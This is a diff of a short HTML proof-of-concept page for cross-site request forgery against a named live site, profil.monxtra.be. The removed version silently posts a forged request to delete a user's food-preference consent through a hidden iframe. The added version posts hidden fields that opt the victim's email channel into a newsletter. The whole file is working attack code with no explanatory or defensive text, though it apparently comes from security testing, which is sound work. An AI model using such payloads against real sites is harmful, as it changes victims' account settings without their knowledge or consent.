@@ -1,15 +1,14 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CSRF PoC - Delete Consent</h2>
-    <form action="https://profil.monxtra.be/manage-profile/food-preferences/consents/delete" method="POST" target="hiddenFrame">
-      <!-- Required POST data as URL-encoded body -->
-      <input type="hidden" name="_data" value="routes/manage-profile+/food-preferences+/consents.delete/index">
-      
-      <!-- Manual trigger -->
+    <h3>CSRF Proof of Concept</h3>
+    <form action="https://profil.monxtra.be/manage-profile/newsletters/dats24?_data=routes%2Fmanage-profile%2B%2Fnewsletters%2B%2F%24commerceId%2Findex" method="POST">
+      <input type="hidden" name="hasAccepted" value="on">
+      <input type="hidden" name="communicationChannelId" value="1228">
+      <input type="hidden" name="communicationChannelType" value="EMAIL">
+      <input type="hidden" name="hasValidAddress" value="true">
+      <input type="hidden" name="isRobinsonMail" value="false">
       <input type="submit" value="Submit CSRF Request">
     </form>
-
-    <iframe name="hiddenFrame" style="display:none;"></iframe>
   </body>
 </html>
